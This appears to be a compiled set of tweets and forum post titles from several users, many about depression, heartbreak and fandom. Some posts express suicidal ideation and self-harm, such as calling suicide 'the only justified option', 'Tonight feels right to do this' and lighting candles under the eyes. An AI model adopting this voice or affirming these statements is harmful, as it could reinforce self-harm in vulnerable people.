good night
need to sleeeeeeep
baekhyun please teach me to be fearless ㅠㅠ
i just want to stop the hurting
i want to be fearless
if i can just turn back the time
im tired
i tried to forget him and ignore him but he still lingers on my mind
idk but it still hurts, no matter what i do
my heart and trust was broken by someone special to me.....
i cry every night hoping that tomorrow my problems would go away
i may look happy around my family, friends and even here but it's the complete opposite
i know my family, friends and even my mutuals here won't believe im suffering from depression
I can't imagine my life without exo, they mean so much to me
exo saves me from drowning in sadness

@1_Aimee_ I'm glad. I'm now thinking what I didn't send you ! Never mind it's not a disaster ! Take care x
@1_Aimee_ I think it was a You tube video by Coldplay called Fix you. I'm so sorry I'm so thick with this technology. But it's brilliant xx
@strictlymagsy I won't. Thank you and stay in touch if your time allows x
@Rudd70Shazy take care. I can't go on xx
@strictlymagsy thanks so much for contacting me. It keeps me positive xx
@Rudd70Shazy it's the least of my worries tbh x
@strictlymagsy Not great to be honest. I'm hoping tomorrow will be  the start of a gradual improvement. Fingers crossed xx💜
@Rudd70Shazy Yes. On my shoulder or back. I told you that weeks ago xx
I'm deleting any reference to Syria and talking tattoos 100%
no. Not yet but I'm not dead for gods sake 😉
@Rudd70Shazy @homelesshorse I was joking with you. You surely know me well enough to share a joke x
@Rudd70Shazy people tweeting me about Syria. I don't support it but they think I do. I can't explain enough. I'm going to send you a link
@Rudd70Shazy Pardon my language. I've been engaged in debates all day and it's nice just to pull back from that. Otherwise Ill never sleep 💜
@Rudd70Shazy Oh people are always going on even when your having a laugh. I'm completely ignoring the fuckers x
@Rudd70Shazy you know who he is ?? X
@Rudd70Shazy I want to hear your cunning plan Baldrick..... X
@Rudd70Shazy If I were the loony trackers you'd be top of my radar. That's barring Cameron and Osborne of course.....
@Rudd70Shazy Haha very funny. I  think I might be fast tracking you to the loony bin xx
@Rudd70Shazy That's because you accidentally escaped from the asylum xxx
@Rudd70Shazy I like to try everything once so there x
@Rudd70Shazy I have seen it I'm not scared of the pain just scared of the choice I have to live with haha x
@Rudd70Shazy It was worth an ask. Im contemplating contemplating getting someone to stain me for life. Still in the contemplation phase xx
@Rudd70Shazy Seriously, you are so funny, brilliant x
@Rudd70Shazy Can't I just borrow some of yours?
@Rudd70Shazy I'm on it. I feel reprimanded x
@Rudd70Shazy nothing better than a depression story at Christmas !! XX
@Rudd70Shazy Haha I'm so sorry but I am laughing. I will do it in a month when I feel slightly better 💜💜💜
@Rudd70Shazy I'm soooo sorry I was joking. Now. I feel awful haha x
@Rudd70Shazy Seriously I'm doing a little better. I'm trying to stay up till 11 which is a long time away xxx
@Rudd70Shazy I'm on Sky News at Ten talking about Depression so stay up !!
@Rudd70Shazy Newsflash.... I've not gone to bed yet. Now there's an improvement 😉
anyone suffering from #depression, like me, could not fail to be inspired by this https://t.co/9wXvMeUqmX
@The76Percent @spideyjonesy tbh it's not about Corbyn. It's about the very future of the Labour Party. He's not up to the job long term
@The76Percent @spideyjonesy To be fair I've never said bomb Syria. Check my tweets I've argued for a blockade. Just let's not be pacifist
@The76Percent @Mudjokivis I do and I'm with you 100%.
@Mudjokivis I mean DM, not that I object !!
@BigPoppaTotoro Take care 👍👍
@Mudjokivis absolutely do x
@The76Percent @Mudjokivis Great. People want to dangle garlic and crosses in my face but they can't see beyond the stigma of 'mentally ill '
@Mudjokivis Will you tell me why or don't you want to go there
@Mudjokivis TBH I've never taken to Facebook. All my family/ lots of friends use it. So, probably like you, bar a photo, I'm anonymous here
@Mudjokivis All we can do is our best. X
@Mudjokivis Anyway your not anonymous to me. There you go
@Mudjokivis Well I decided to be open because I think it's treated with contempt and I don't care if I get abuse. My politics remain intact.
@Mudjokivis It's not like Im weak and pathetic. I'm the opposite. It's just so annoying but everyone is right. This isn't doable overnight.
@3075John @The76Percent @spideyjonesy Your followed ! Love to hear your views going forward.
@Mudjokivis Mmmm. I see what you mean... I want to share a fact. Without people like you helping me I truly don't know where I'd be. Really.
@3075John @The76Percent @spideyjonesy Noooo. It's clear you have a sense of humour. I just can't talk Syria anymore today. I just can't. 😉
@3075John @The76Percent @spideyjonesy Haha stick the piano back under the window then, because it was a bugger to move earlier on....
@Mudjokivis No don't get your coat. I agree with that cliche. I'm waiting for one moment when I think, yep I'm improving. I can feel it... 💜
@3075John @The76Percent @spideyjonesy John are you the person who turns up at the end of the party when everyone wants to go home.....

So don't rep. Unless you know every detail about our island. Because your suppose to rep. Where your home is, Guam is my home❤️🌺
That may not seem like a lot considering we are JUST A SMALL island 
 But that's a lot of grief for our BIG family.
There has been 2,591 births just this year, that's how many people we have gained this year
But we have also had 684 deaths
Guam isn't JUST a little island... It's a home of 171,220 people.
And how they came from a little island and got where they are today! But then they turn around and say they miss it...
Fucking irritates me how people rep. Something to try and act all mysterious and sweet because their talking about how Guam was THEIR island
If you lived here from years 1- 14 or below, then moved to the states, don't try to rep. Guam unless you a true islander at that age!

I WANNA HANG OUT AGAIN SOON @machinesway
LEON I MISS U AND I LOVE U @machinesway
its just kind of mildly irritating? problems with communication but u kno, what relationship, romantic or platonic doesnt struggle w that
bc like idk what i wanna ask all the time i dont know EXACTLY what to talk about
hes just very quiet and super dense so getting discussion out of him is hard and i have to directly ask everything which is hard
idk!!!!!!!!!!! im probably just being paranoid u kno. im anxious about my anxiety lmfao and idk what to do about it
but i cant really. figure out?? like idk i feel better so i just leave it since i cant elaborate
i feel myself getting anxious about things w luke and idk why like... i dont rly feel like my concerns get resolved when we talk about it
like hes hesitant and scared about it totally understandable im a lil scared too but we'd both give it a shot and see how it goes
the luke roommate alpha plan is A Go captain
nice to kno tho that i never have to worry about that happening with luke bc hes aro and has 0 interest in dating lmfao
i guess it was stupid of me to ever think thatd actually happen
idk like,, idk
and then after he moved he was like i didnt just do it for my datefriend and im like stares directly into the camera like im on the office
for years about being roommates and him moving to california and like it was a really serious conversation
ok never tell him but im still and will always be bitter and salty dan moved to nebraska or whatever when like we had been talking
but im just like i cant deal. i cant. i cant
like it doesnt surprise me its so similar bc he worked on homestuck
and the fandom like dude its so similar its the same thing i cant i cant go back to that life
like just i can literally smell the big dog WHATS THE MATTER IS UNDERTALE TOO *DEEP* FOR YOU memes
i literally cant play undertale bc it reminds me WAY too much of homestuck

if you like support and encourage vaughn to be braver and like be proud of him he reacts so adorably,,,
ok but if yall wondering why i ship fiona/vaughn its literally bc of the whole scene where theyre in the garage before the death race
OFC IM GONNA HAVE FIONA AND VAUGHN HUG.......
LUKE DIDNT HUG VAUGHN WHEN U REUNITE WITH HIM IN EP 5 I COULDNT FUCKING BELIEVE IT
VAUGHN NEEDS A HUG
im going to do another playthrough where i trust jack and literally the only reason im doing it is so i can hug vaughn
i just rly rly rly like rhys and vaughn's platonic relationship,, its really nice their friendship meANS A LOT TO ME
i love rhys and vaughn's friendship thats why im like idk if i ship it romantically? like yEA i know i know just like u feel me i just

There's no one else I'd rather be with than be with you, even if you're no longer mine &amp; you're so gone. I love you so much.
I never loved someone so much like you. You're literally the most special &amp; perfect person in my eyes. There's no one else like you.
I know you're trying to be faithful to your boyfriend, but know that I love you with all that I got &amp; I will never stop, till I die. #A
Even if you don't want to see this or even hear me anymore, I'm so happy you're in my heart &amp; I would do anything to have you back. #broken
Even if you're gone &amp; don't even want to talk to me anymore, you mean the absolute world to me &amp; I'm so thankful you're still in my heart.

Reasons why I hate eating sandwiches is because my stomach feels bloated &amp; I feel fat as shit! Never again!

WHATISAPLANET
What's real anymore?
Started therapy for the second time today, but I don't know if it will be enough
Tired and bored
I feel like I gave up, and having trouble getting back on track.
I just remembered it started even earlier
I've deleted most of my means to contact people.
Anhedonia seems uncurable. Uncomfortably numb
I want to kill myself, but I don't. But I wouldn't be surprised if I die tonight.
4chan has an "assassins for hire" board that pops up every now and again, and I found a bounty on my head there...with 125 replies.
Original Version of the Michelin tire man.
Talking seems to help so many people here. But it will never help me
I'm a waste of space
I posted on yikyak that I wanted to jump off the local bridge, received tons of support. Don't give up.
The circumstances of my life are just so awful.
really dont to live anymore
When I was 9
2016
My dog could easily be replaced with a big, heated, gently pulsating ball of brown fuzz. It would require less upkeep too.
I thought I was getting the gun back
My heart hurts. I've pushed through everything for so long but it feels like I just can't handle it. It feels like my heart is going to bre…
I am done trying to fix myself
Lies
there is literally no point in going on
when did the future switch from being a promise to a threat?
I'm done faking happiness.
I'm so angry other people don't have to deal with this.
I was excited to get the gun back
I'm so drunk, I couldn't even walk straight all the way to way back to my room, but at least I have barely enough sense left to post here i…
Seeing myself devolve over the last year has been demoralizing.
Don't see the point anymore
I feel like suicide is the only justified option.
I Just Feel Like Everything's Pointless
Ho Ho Ho
Those Things Are Still Out There
You could ruin their night with one text. Do it.
People never care about me as much as I care about them.
I got angry and frustrated, after that just sad and left, doctor punished me because i am depressed and can't do much.
shes the most beautiful girl ive ever seen
I've lost the best friend I ever had
I need help now what do I do
Getting help has been an impossible series of obstacles.
Creating your own meaning in life is a luxury for the privileged
Nothing works
"You're destined for great things."
Tonight feels right to do this.
I should shove these birthday candles under my eyelids and light them
I'm gay.
I Just turned 21 and I am still a virgin not by choice. I feel ugly and worthless. Just want to end my embarrassing life.
I'm just so tired
I Hate Life
Trying to Scare Someone Saved My Life
